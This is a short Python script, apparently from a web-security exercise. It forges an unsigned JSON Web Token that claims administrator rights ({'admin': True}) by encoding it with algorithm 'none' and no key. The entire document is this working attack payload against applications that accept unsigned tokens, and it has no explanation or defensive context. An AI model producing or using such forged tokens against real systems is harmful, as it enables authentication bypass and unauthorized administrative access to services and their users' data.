import jwt
import base64
import json

print(jwt.encode({"admin": True}, None, algorithm="none"))